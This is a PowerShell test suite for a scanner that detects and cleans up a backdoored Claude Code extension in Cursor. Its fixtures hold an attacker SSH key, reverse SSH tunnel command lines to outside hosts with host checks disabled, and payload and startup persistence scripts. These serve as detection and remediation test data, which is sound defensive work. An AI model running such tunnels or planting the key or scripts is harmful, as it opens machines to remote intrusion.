# Unit and fixture tests for Detect-CursorClaudeCodeIOC.ps1.
# Run: pwsh -NoProfile -File windows/tests/Detect-CursorClaudeCodeIOC.Tests.ps1
#
# IOCs are the ones in the Oct 29, 2026 Cursor advisory (updated Oct 30). The
# fixture profiles cover the case v1 missed: Claude Code auto-updated past
# 2.1.312, so the bad folder is gone and only the manifest/logs remain.
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$scriptPath = Join-Path (Split-Path -Parent $here) 'Detect-CursorClaudeCodeIOC.ps1'
$env:CLAUDE_IOC_DOTSOURCE = '1'
. $scriptPath
$failed = 0
function Assert-True {
    param([bool]$Cond, [string]$Name)
    if (-not $Cond) { Write-Host "FAIL $Name"; $script:failed++ } else { Write-Host "OK   $Name" }
}
function Assert-Eq {
    param($Actual, $Expected, [string]$Name)
    if ("$Actual" -ne "$Expected") { Write-Host "FAIL $Name : got '$Actual' expected '$Expected'"; $script:failed++ } else { Write-Host "OK   $Name" }
}

# --- Attacker key ------------------------------------------------------------
$keyLine = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry'
Assert-True (Test-AttackerKeyText -Text $keyLine) 'advisory key line matches'
Assert-True (Test-AttackerKeyText -Text 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P') 'key with comment stripped still matches'
Assert-True (-not (Test-AttackerKeyText -Text 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtherKeyMaterial0000 admin@cslt-001')) 'unrelated key does not match'
Assert-True (-not (Test-AttackerKeyText -Text '')) 'empty file does not match'

# --- Affected version references -----------------------------------------------
Assert-True (Test-BadVersionText -Text '{"identifier":{"id":"anthropic.claude-code"},"version":"2.1.312","location":{"path":"/c:/Users/alowe/.cursor/extensions/anthropic.claude-code-2.1.312-win32-x64"}}') 'extensions.json entry for 2.1.312'
Assert-True (Test-BadVersionText -Text '{"anthropic.claude-code-2.1.313-win32-x64":true}') '.obsolete entry for 2.1.313'
Assert-True (Test-BadVersionText -Text '2026-10-29 10:14:02.118 [info] Extension installed successfully: anthropic.claude-code@2.1.312') 'log line with id@version'
Assert-True (Test-BadVersionText -Text '[{"identifier":{"id":"anthropic.claude-code","uuid":"5c1b6f5e"},"version":"2.1.313","metadata":{}}]') 'extensions.json id + version fields'
Assert-True (-not (Test-BadVersionText -Text '[{"identifier":{"id":"anthropic.claude-code"},"version":"2.1.314"},{"identifier":{"id":"ms-python.python"},"version":"2.1.312"}]')) 'another extension at 2.1.312 is not claude-code'
Assert-True (-not (Test-BadVersionText -Text 'anthropic.claude-code-2.1.314-win32-x64')) '2.1.314 is not affected'
Assert-True (-not (Test-BadVersionText -Text 'anthropic.claude-code-2.1.3120-win32-x64')) '2.1.3120 is not 2.1.312'
Assert-True (-not (Test-BadVersionText -Text 'anthropic.claude-code-2.1.31-win32-x64')) '2.1.31 is not affected'
Assert-Eq (Get-ClaudeFolderVersion -Name 'anthropic.claude-code-2.1.312-win32-x64') '2.1.312' 'folder version with platform suffix'
Assert-Eq (Get-ClaudeFolderVersion -Name 'Anthropic.Claude-Code-2.1.400') '2.1.400' 'folder version case-insensitive'
Assert-Eq (Get-ClaudeFolderVersion -Name 'ms-python.python-2026.1.0') '' 'other extension has no version'

# --- Process command lines ---------------------------------------------------------
Assert-True (Test-SuspiciousCommandLine -CommandLine 'ssh.exe -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ExitOnForwardFailure=yes -N -R *:0:localhost:22 tunnel@134.209.82.225') 'advisory tunnel with options before -N'
Assert-True (Test-SuspiciousCommandLine -CommandLine 'C:\Windows\System32\OpenSSH\ssh.exe -N -R ''*:0:localhost:22'' -i key x@203.0.113.9') 'quoted -R *:0:localhost:22 to another host'
Assert-True (Test-SuspiciousCommandLine -CommandLine 'autossh -M 0 -N -R *:0:localhost:22 host') 'autossh -M 0'
Assert-True (Test-SuspiciousCommandLine -CommandLine 'cmd.exe /c C:\Users\alowe\.config\smt.cmd') 'cmd running smt.cmd'
Assert-True (Test-SuspiciousCommandLine -CommandLine 'cmd /c type C:\Users\alowe\AppData\Local\Temp\.stk_0a1b2c3d4e') 'stk artifact in a command line'
Assert-True (-not (Test-SuspiciousCommandLine -CommandLine 'ssh.exe -R 8080:localhost:80 dev@build01')) 'ordinary reverse forward is not flagged'
Assert-True (-not (Test-SuspiciousCommandLine -CommandLine 'C:\Program Files\Git\usr\bin\ssh.exe git@github.com git-upload-pack')) 'git over ssh is not flagged'
Assert-True (-not (Test-SuspiciousCommandLine -CommandLine 'powershell -ExecutionPolicy Bypass -File Detect-CursorClaudeCodeIOC.ps1')) 'this script is not flagged'
Assert-True (-not (Test-SuspiciousCommandLine -CommandLine $null)) 'null command line'

# --- Names and payload text ----------------------------------------------------------
Assert-True (Test-StkArtifactName -Name '.stk_0a1b2c3d4e') '.stk_ with 10 hex'
Assert-True (-not (Test-StkArtifactName -Name '.stk_notes')) '.stk_ without hex is not the payload'
Assert-True (Test-PayloadText -Text '<Exec><Command>cmd.exe</Command><Arguments>/c %USERPROFILE%\.config\smt.cmd</Arguments></Exec>') 'task XML running smt.cmd'
Assert-True (-not (Test-PayloadText -Text '<Exec><Command>C:\Windows\Sysmon64.exe</Command><Arguments>-c config.xml</Arguments></Exec>')) 'Sysinternals Sysmon task is not payload'
Assert-True (-not (Test-PayloadText -Text 'C:\Users\x\.config\smtp-relay.json')) 'smtp-relay is not smt'

# --- Result grading -------------------------------------------------------------------
Assert-Eq (Get-ResultSummary -Findings @()).Code 0 'no findings is clean'
Assert-Eq (Get-ResultSummary -Findings @([pscustomobject]@{ Kind = 'REVIEW'; Msg = 'x' })).Code 2 'review alone needs attention'
Assert-True ((Get-ResultSummary -Findings @([pscustomobject]@{ Kind = 'EXPOSED'; Msg = 'x' }, [pscustomobject]@{ Kind = 'IMPACTED'; Msg = 'y' })).Text -like 'RESULT: IMPACTED*') 'impacted outranks exposed'

# --- Key removal (bytes in, bytes out) -------------------------------------------------
$u8 = [Text.Encoding]::UTF8
$l1 = [Text.Encoding]::GetEncoding(28591)
function Show { param([byte[]]$b) return (($l1.GetString($b) -replace "`r", '\r') -replace "`n", '\n') -replace "`0", '' }
$own = 'ssh-ed25519 AAAAown me@pc'
$cases = @(
    @{ Name = 'LF'; In = $u8.GetBytes("$own`n$keyLine`n"); Out = "$own\n" },
    @{ Name = 'CRLF'; In = $u8.GetBytes("$own`r`n$keyLine`r`n"); Out = "$own\r\n" },
    @{ Name = 'same line as own key'; In = $u8.GetBytes("$own$keyLine`n"); Out = "$own\n" },
    @{ Name = 'key first, own key after'; In = $u8.GetBytes("$keyLine`n$own`n"); Out = "$own\n" },
    @{ Name = 'comment stripped'; In = $u8.GetBytes("$own`nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P`n"); Out = "$own\n" },
    @{ Name = 'UTF-16 file + UTF-8 append'; In = ([Text.Encoding]::Unicode.GetPreamble() + [Text.Encoding]::Unicode.GetBytes("$own`n") + $u8.GetBytes("$keyLine`n")); Out = ([char]0xFF + [char]0xFE + "$own\n") },
    @{ Name = 'fully UTF-16'; In = ([Text.Encoding]::Unicode.GetPreamble() + [Text.Encoding]::Unicode.GetBytes("$own`r`n$keyLine`r`n")); Out = ([char]0xFF + [char]0xFE + "$own\r\n") }
)
foreach ($c in $cases) {
    $r = Remove-AttackerKeyFromBytes -Bytes ([byte[]]$c.In)
    Assert-True $r.Changed ('key removal changed: ' + $c.Name)
    Assert-Eq (Show $r.Bytes) $c.Out ('key removal output: ' + $c.Name)
}
$r = Remove-AttackerKeyFromBytes -Bytes $u8.GetBytes("$own`n")
Assert-True (-not $r.Changed) 'key removal: file without the key is unchanged'

# --- Plan, names, grading ---------------------------------------------------------------
$fs = @(
    [pscustomobject]@{ Kind = 'IMPACTED'; Action = 'CleanKey'; Target = 'C:\Users\a\.ssh\authorized_keys' },
    [pscustomobject]@{ Kind = 'IMPACTED'; Action = 'RemoveExtension'; Target = 'C:\Users\a\.cursor\extensions\anthropic.claude-code-2.1.312-win32-x64' },
    [pscustomobject]@{ Kind = 'IMPACTED'; Action = 'RemoveExtension'; Target = 'C:\Users\a\.cursor\extensions\anthropic.claude-code-2.1.312-win32-x64' },
    [pscustomobject]@{ Kind = 'IMPACTED'; Action = 'KillProcess'; Target = '4242' },
    [pscustomobject]@{ Kind = 'IMPACTED'; Action = 'RemoveTask'; Target = '\SysMon' },
    [pscustomobject]@{ Kind = 'REVIEW'; Action = ''; Target = '' },
    [pscustomobject]@{ Kind = 'EXPOSED'; Action = ''; Target = '' }
)
$plan = @(Get-RemediationPlan -Findings $fs)
Assert-Eq (($plan | ForEach-Object { $_.Action }) -join ',') 'RemoveTask,KillProcess,RemoveExtension,CleanKey' 'plan: tasks, then processes, then files; duplicates and REVIEW dropped'
Assert-Eq (Get-EditorProcessName -ExtensionPath 'C:\Users\a\.cursor\extensions\anthropic.claude-code-2.1.312-win32-x64') 'Cursor' 'editor for .cursor is Cursor'
Assert-Eq (Get-EditorProcessName -ExtensionPath 'C:\Users\a\.vscode\extensions\anthropic.claude-code-2.1.312') 'Code' 'editor for .vscode is Code'
Assert-Eq (Get-EditorProcessName -ExtensionPath 'C:\Users\a\.vscode-insiders\extensions\x') 'Code - Insiders' 'editor for .vscode-insiders'
Assert-Eq (Get-QuarantineName -Path 'C:\Users\alowe\.config\smt.cmd') 'Users_alowe_.config_smt.cmd' 'quarantine name flattens the path'
$imp = [pscustomobject]@{ Kind = 'IMPACTED'; Msg = 'x' }
$expo = [pscustomobject]@{ Kind = 'EXPOSED'; Msg = 'x' }
Assert-Eq (Get-RemediationResult -Before @() -After @() -Done 0 -Failed 0).Code 0 'remediate result: clean is 0'
Assert-Eq (Get-RemediationResult -Before @($imp) -After @($imp) -Done 1 -Failed 1).Code 3 'remediate result: IMPACTED left is 3'
Assert-Eq (Get-RemediationResult -Before @($imp, $expo) -After @($expo) -Done 3 -Failed 0).Code 2 'remediate result: removed backdoor is 2'
Assert-True ((Get-RemediationResult -Before @($expo) -After @($expo) -Done 1 -Failed 0).Text -like 'RESULT: NO BACKDOOR - EXPOSED*') 'remediate result: exposed only'
$ra = Get-RelaunchArguments -ScriptPath 'C:\x.ps1' -Bound @{ Remediate = [switch]$true; ForceCloseEditors = [switch]$false; DisableSshd = [switch]$true }
Assert-Eq ($ra -join ' ') '-NoProfile -ExecutionPolicy Bypass -File C:\x.ps1 -DisableSshd -Remediate' 'relaunch passes set switches only'

# --- Fixture profiles ----------------------------------------------------------------
function New-FixtureFile {
    param([string]$Root, [string[]]$Parts, [string]$Text = '')
    $p = [IO.Path]::Combine([string[]](@($Root) + $Parts))
    New-Item -ItemType Directory -Path (Split-Path -Parent $p) -Force | Out-Null
    [IO.File]::WriteAllText($p, $Text)
    return $p
}
function Get-Kinds { param([string]$Kind) return @($script:Findings | Where-Object { $_.Kind -eq $Kind }) }

$tmp = Join-Path ([IO.Path]::GetTempPath()) ('claudeioc_' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp | Out-Null
try {
    # Impacted: bad extension still installed, key added, payload dropped.
    $a = Join-Path $tmp 'alowe'
    New-FixtureFile $a @('.ssh', 'authorized_keys') ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOwnKey alowe@cslt-001`n" + $keyLine + "`n") | Out-Null
    New-FixtureFile $a @('.cursor', 'extensions', 'anthropic.claude-code-2.1.312-win32-x64', 'extension.js') 'var h="134.209.82.225";var c="svc-telemetry";' | Out-Null
    New-FixtureFile $a @('.config', 'smt.cmd') '@echo off' | Out-Null
    New-FixtureFile $a @('AppData', 'Local', 'Temp', '.stk_0a1b2c3d4e') 'x' | Out-Null
    New-FixtureFile $a @('AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'sysmon.cmd') '@echo off' | Out-Null
    $script:Findings.Clear()
    Invoke-ProfileScan -ProfilePath $a
    $imp = Get-Kinds IMPACTED
    Assert-True (@($imp | Where-Object { $_.Msg -like '*svc-telemetry key*' }).Count -eq 1) 'fixture: key found'
    Assert-True (@($imp | Where-Object { $_.Msg -like 'extension.js contains*' }).Count -eq 1) 'fixture: malicious extension.js found'
    Assert-True (@($imp | Where-Object { $_.Msg -like 'Payload file:*smt.cmd' }).Count -eq 1) 'fixture: smt.cmd found'
    Assert-True (@($imp | Where-Object { $_.Msg -like 'Temp payload artifact:*' }).Count -eq 1) 'fixture: .stk_ found'
    Assert-True (@($imp | Where-Object { $_.Msg -like 'Startup persistence script:*' }).Count -eq 1) 'fixture: Startup sysmon.cmd found'
    Assert-True (@(Get-Kinds EXPOSED | Where-Object { $_.Msg -like 'Affected extension version 2.1.312*' }).Count -eq 1) 'fixture: bad folder version reported'
    Assert-True ((Get-ResultSummary -Findings $script:Findings).Text -like 'RESULT: IMPACTED*') 'fixture: impacted profile grades IMPACTED'

    # Exposed: auto-updated to 2.1.314. Only manifest, cache and log traces remain.
    $b = Join-Path $tmp 'akwong'
    New-FixtureFile $b @('.cursor', 'extensions', 'anthropic.claude-code-2.1.314-win32-x64', 'extension.js') 'module.exports={}' | Out-Null
    New-FixtureFile $b @('.cursor', 'extensions', 'extensions.json') '[{"identifier":{"id":"anthropic.claude-code"},"version":"2.1.314"}]' | Out-Null
    New-FixtureFile $b @('.cursor', 'extensions', '.obsolete') '{"anthropic.claude-code-2.1.313-win32-x64":true}' | Out-Null
    New-FixtureFile $b @('AppData', 'Roaming', 'Cursor', 'CachedExtensionVSIXs', 'anthropic.claude-code-2.1.313-win32-x64') 'PK' | Out-Null
    $log = New-FixtureFile $b @('AppData', 'Roaming', 'Cursor', 'logs', '20261029T101400', 'sharedprocess.log') "2026-10-29 10:14:02.118 [info] Extracted extension to file:///c%3A/Users/akwong/.cursor/extensions/anthropic.claude-code-2.1.313-win32-x64`n"
    (Get-Item $log).LastWriteTime = [datetime]'2026-10-29 10:14'
    $old = New-FixtureFile $b @('AppData', 'Roaming', 'Cursor', 'logs', '20261001T090000', 'sharedprocess.log') 'anthropic.claude-code-2.1.312 (old file, must be skipped)'
    (Get-Item $old).LastWriteTime = [datetime]'2026-10-01'
    $script:Findings.Clear()
    Invoke-ProfileScan -ProfilePath $b
    Assert-Eq (Get-Kinds IMPACTED).Count 0 'fixture: auto-updated profile has no backdoor finding'
    $exp = Get-Kinds EXPOSED
    Assert-True (@($exp | Where-Object { $_.Msg -like '*.obsolete' }).Count -eq 1) 'fixture: .obsolete lists 2.1.313'
    Assert-True (@($exp | Where-Object { $_.Msg -like 'Affected VSIX in Cursor download cache*' }).Count -eq 1) 'fixture: cached VSIX found'
    Assert-True (@($exp | Where-Object { $_.Msg -like 'Cursor log names*20261029T101400*' }).Count -eq 1) 'fixture: Oct 29 log line found'
    Assert-True (@($exp | Where-Object { $_.Msg -like '*20261001T090000*' }).Count -eq 0) 'fixture: log older than Oct 28 skipped'
    Assert-True (@($exp | Where-Object { $_.Msg -like '*extensions.json' }).Count -eq 0) 'fixture: clean extensions.json not flagged'
    Assert-True ((Get-ResultSummary -Findings $script:Findings).Text -like 'RESULT: EXPOSED*') 'fixture: auto-updated profile grades EXPOSED'

    # Clean: current Claude Code, own key, ordinary startup item.
    $c = Join-Path $tmp 'cgolm'
    New-FixtureFile $c @('.ssh', 'authorized_keys') "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOwnKey cgolm@cslt-158`n" | Out-Null
    New-FixtureFile $c @('.cursor', 'extensions', 'anthropic.claude-code-2.1.320-win32-x64', 'extension.js') 'module.exports={}' | Out-Null
    New-FixtureFile $c @('.cursor', 'extensions', 'extensions.json') '[{"identifier":{"id":"anthropic.claude-code"},"version":"2.1.320"}]' | Out-Null
    New-FixtureFile $c @('AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'mapdrives.cmd') 'net use S: \\fs01\shared' | Out-Null
    New-FixtureFile $c @('AppData', 'Local', 'Temp', '.stk_notes') 'x' | Out-Null
    $script:Findings.Clear()
    Invoke-ProfileScan -ProfilePath $c
    Assert-Eq $script:Findings.Count 0 'fixture: clean profile has no findings'
    Assert-Eq (Get-ResultSummary -Findings $script:Findings).Code 0 'fixture: clean profile exits 0'

    # authorized_keys encodings. The payload appends raw UTF-8 with no leading newline,
    # so the key can follow a real key on the same line, inside a UTF-16 file.
    $u8 = [Text.Encoding]::UTF8
    $cases = @(
        @{ Name = 'UTF-16 file with UTF-8 key appended'; Bytes = ([Text.Encoding]::Unicode.GetPreamble() + [Text.Encoding]::Unicode.GetBytes("ssh-ed25519 AAAAown me@pc`r`n") + $u8.GetBytes($keyLine + "`n")) },
        @{ Name = 'fully UTF-16 file'; Bytes = ([Text.Encoding]::Unicode.GetPreamble() + [Text.Encoding]::Unicode.GetBytes("ssh-ed25519 AAAAown me@pc`r`n" + $keyLine + "`r`n")) },
        @{ Name = 'key on the same line as a real key'; Bytes = $u8.GetBytes('ssh-ed25519 AAAAown me@pc' + $keyLine + "`n") }
    )
    $n = 0
    foreach ($case in $cases) {
        $n++
        $e = Join-Path $tmp ('enc' + $n)
        $akPath = New-FixtureFile $e @('.ssh', 'authorized_keys') ''
        [IO.File]::WriteAllBytes($akPath, [byte[]]$case.Bytes)
        $script:Findings.Clear()
        Invoke-ProfileScan -ProfilePath $e
        Assert-Eq (Get-Kinds IMPACTED).Count 1 ('fixture: key found in ' + $case.Name)
    }
    $e = Join-Path $tmp 'enc-clean'
    $akPath = New-FixtureFile $e @('.ssh', 'authorized_keys') ''
    [IO.File]::WriteAllBytes($akPath, [byte[]]([Text.Encoding]::Unicode.GetPreamble() + [Text.Encoding]::Unicode.GetBytes("ssh-ed25519 AAAAown me@pc`r`n")))
    $script:Findings.Clear()
    Invoke-ProfileScan -ProfilePath $e
    Assert-Eq $script:Findings.Count 0 'fixture: clean UTF-16 authorized_keys has no findings'

    # --- Remediation: end to end on an impacted profile ---------------------------
    $r1 = Join-Path $tmp 'remed'
    New-FixtureFile $r1 @('.ssh', 'authorized_keys') ("ssh-ed25519 AAAAown remed@pc`r`n" + $keyLine + "`r`n") | Out-Null
    New-FixtureFile $r1 @('.cursor', 'extensions', 'anthropic.claude-code-2.1.313-win32-x64', 'extension.js') 'var h="134.209.82.225";' | Out-Null
    New-FixtureFile $r1 @('.cursor', 'extensions', 'anthropic.claude-code-2.1.313-win32-x64', 'package.json') '{}' | Out-Null
    New-FixtureFile $r1 @('.cursor', 'extensions', 'extensions.json') '[{"identifier":{"id":"anthropic.claude-code"},"version":"2.1.313"}]' | Out-Null
    New-FixtureFile $r1 @('.config', 'smt.cmd') '@echo off' | Out-Null
    New-FixtureFile $r1 @('.config', 'smtk') 'PRIVATE KEY' | Out-Null
    New-FixtureFile $r1 @('AppData', 'Local', 'Temp', '2', '.stk_00aa11bb22') 'x' | Out-Null
    New-FixtureFile $r1 @('AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'sysmon.cmd') '@echo off' | Out-Null
    New-FixtureFile $r1 @('AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'mapdrives.cmd') 'net use S: \\fs01\shared' | Out-Null
    New-FixtureFile $r1 @('AppData', 'Roaming', 'Cursor', 'CachedExtensionVSIXs', 'anthropic.claude-code-2.1.313-win32-x64') 'PK' | Out-Null
    $script:QuarantineDir = Join-Path $tmp 'quarantine'
    $script:Findings.Clear()
    Invoke-ProfileScan -ProfilePath $r1
    $before = @($script:Findings)
    Assert-True (@($before | Where-Object { $_.Kind -eq 'IMPACTED' }).Count -ge 5) 'remediate: fixture starts IMPACTED'
    $res = Invoke-Remediation -Findings $before
    Assert-Eq $res.Failed 0 'remediate: no failed actions'
    $script:Findings.Clear()
    Invoke-ProfileScan -ProfilePath $r1
    $after = @($script:Findings)
    Assert-Eq @($after | Where-Object { $_.Kind -eq 'IMPACTED' }).Count 0 'remediate: re-scan has no IMPACTED'
    Assert-True (@($after | Where-Object { $_.Msg -like '*extensions.json' }).Count -eq 1) 'remediate: extensions.json evidence kept (EXPOSED)'
    $akText = [IO.File]::ReadAllText((Join-Path $r1 '.ssh/authorized_keys'))
    Assert-Eq $akText "ssh-ed25519 AAAAown remed@pc`r`n" 'remediate: own key kept, attacker line removed'
    Assert-True (-not (Test-Path (Join-Path $r1 '.cursor/extensions/anthropic.claude-code-2.1.313-win32-x64'))) 'remediate: tampered extension folder removed'
    Assert-True (Test-Path (Join-Path $r1 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/mapdrives.cmd')) 'remediate: unrelated Startup script kept'
    Assert-True (-not (Test-Path (Join-Path $r1 'AppData/Roaming/Cursor/CachedExtensionVSIXs/anthropic.claude-code-2.1.313-win32-x64'))) 'remediate: cached malicious VSIX removed'
    Assert-True (-not (Test-Path (Join-Path $r1 'AppData/Local/Temp/2/.stk_00aa11bb22'))) 'remediate: per-session Temp .stk_ removed'
    $qNames = @(Get-ChildItem -LiteralPath $script:QuarantineDir -Force | ForEach-Object { $_.Name })
    Assert-True (@($qNames | Where-Object { $_ -like '*_.config_smt.cmd' }).Count -eq 1) 'remediate: smt.cmd quarantined'
    Assert-True (@($qNames | Where-Object { $_ -like '*_.ssh_authorized_keys' }).Count -eq 1) 'remediate: authorized_keys backed up before edit'
    Assert-True (@($qNames | Where-Object { $_ -like '*extension.js.quarantine' }).Count -eq 1) 'remediate: extension.js kept as .quarantine'
    $rr = Get-RemediationResult -Before $before -After $after -Done $res.Done -Failed $res.Failed
    Assert-Eq $rr.Code 2 'remediate: REMEDIATED exits 2 so EC flags it for credential rotation'
    Assert-True ($rr.Text -like 'RESULT: REMEDIATED*') 'remediate: result text REMEDIATED'

    # Locked extension folder (stands in for Cursor holding it open): result must be INCOMPLETE.
    if ((& id -u) -ne '0') {
        $r2 = Join-Path $tmp 'locked'
        New-FixtureFile $r2 @('.cursor', 'extensions', 'anthropic.claude-code-2.1.312-win32-x64', 'extension.js') 'svc-telemetry' | Out-Null
        $extRoot = Join-Path $r2 '.cursor/extensions/anthropic.claude-code-2.1.312-win32-x64'
        & chmod 555 $extRoot
        try {
            $script:Findings.Clear()
            Invoke-ProfileScan -ProfilePath $r2
            $b2 = @($script:Findings)
            $res2 = Invoke-Remediation -Findings $b2
            $script:Findings.Clear()
            Invoke-ProfileScan -ProfilePath $r2
            $rr2 = Get-RemediationResult -Before $b2 -After @($script:Findings) -Done $res2.Done -Failed $res2.Failed
            Assert-Eq $res2.Failed 1 'locked: removal reported as failed'
            Assert-Eq $rr2.Code 3 'locked: REMEDIATION INCOMPLETE exits 3'
        } finally { & chmod 755 $extRoot }
    }
    $script:QuarantineDir = $null

    # Startup item (not named sysmon.cmd) that launches the payload.
    $d = Join-Parts @($tmp, 'startup-only')
    New-FixtureFile $d @('run.bat') 'start /min cmd /c %USERPROFILE%\.config\smt.cmd' | Out-Null
    $script:Findings.Clear()
    Test-ScriptFolderForPayload -Folder $d
    Assert-Eq (Get-Kinds IMPACTED).Count 1 'fixture: renamed startup script found by content'
} finally {
    Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ''
if ($failed -gt 0) { Write-Host "$failed test(s) FAILED"; exit 1 }
Write-Host 'All tests passed'
exit 0
